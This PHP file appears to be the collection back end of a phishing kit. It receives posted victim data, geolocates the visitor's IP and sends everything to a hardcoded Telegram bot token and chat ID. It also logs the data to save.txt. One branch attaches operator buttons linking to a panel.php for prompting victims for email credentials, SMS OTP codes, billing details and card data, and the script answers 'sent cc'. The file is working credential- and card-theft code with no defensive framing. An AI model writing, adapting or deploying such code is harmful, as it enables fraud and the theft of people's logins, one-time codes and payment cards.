<?php
    header("Access-Control-Allow-Origin: *"); 

    $token = "6752609406:AAG824SoqJDbwO6Io_eDEmmoA3mrU4DEaTI";
    $chatid = "1069373492";

   if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $ipdat = @json_decode(file_get_contents( 
        "http://www.geoplugin.net/json.gp?ip=" . $ip));

    $countryName = $ipdat->geoplugin_countryName;
    $cityName =  $ipdat->geoplugin_city;
    $region =  $ipdat->geoplugin_region;
    $timeZone =  $ipdat->geoplugin_timezone;

  
    if(isset($_POST["data"])){

        $data = $_POST["data"];

        if($data !== null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "🟢 IP : " .$ip. "\n"; 
        $message .= $data;
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City Name: ". $cityName."\n";
        $message .= "Time Zone: ". $timeZone."\n";
        $message .= "Region: ". $region."\n";

          
        file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
      
    }

    }


    if(isset($_POST["data2"])){
         $data = $_POST["data2"];
         $baseUrl = $_POST["baseUrl"];

        if($data !== null){
        $message = "";
        $message .= "---|@systembott|---\n";
        $message .= "🟢 IP : " .$ip. "\n"; 
        $message .= $data;
        $message .= "\n------------ Location ---------------\n";
        $message .= "Country Name: ".$countryName."\n";
        $message .= "City Name: ". $cityName."\n";
        $message .= "Time Zone: ". $timeZone."\n";
        $message .= "Region: ". $region."\n";

          
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $buttons = [
              [
                [
                    "text" => "🚫 Invalid User",
                    "url" => $baseUrl."/panel.php?response=invaliduser&ip=".$ipaddress
                ],
                 [
                    "text" => "🚫 Invalid Email/pass",
                    "url" => $baseUrl."/panel.php?response=invalidemailpass&ip=".$ipaddress
                ],
                [
                    "text" => "🚫 Invalid OTP",
                    "url" => $baseUrl."/panel.php?response=invalidotp&ip=".$ipaddress
                ],
            ],
            [
                [
                    "text" => "📧 Email",
                    "url" => $baseUrl."/panel.php?response=email&ip=".$ipaddress
                ],
                [
                    "text" => "📱 OTP SMS",
                    "url" => $baseUrl."/panel.php?response=sms&ip=".$ipaddress
                ],
                [
                    "text" => "👤 Billing",
                    "url" => $baseUrl."/panel.php?response=bill&ip=".$ipaddress
                ],
                [
                    "text" => "🏧 Card ",
                    "url" => $baseUrl."/panel.php?response=card&ip=".$ipaddress
                ],
                  [
                    "text" => "✅ Finish",
                    "url" => $baseUrl."/panel.php?response=done&ip=".$ipaddress
                ]
                  
                ],
            
        ];

        $keyboard = json_encode([
            "inline_keyboard" => $buttons
        ]);
       
         $data = http_build_query([
            'text' => $message,
            'chat_id' => $chatid,
            'reply_markup' => $keyboard
        ]);
        
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?$data";
        file_get_contents($url);
        
        $handle = fopen("save.txt", "a");
        fwrite($handle, $message);
        fclose($handle);
        echo json_encode(["success" => "sent cc"]);
      
    }
    }

?>

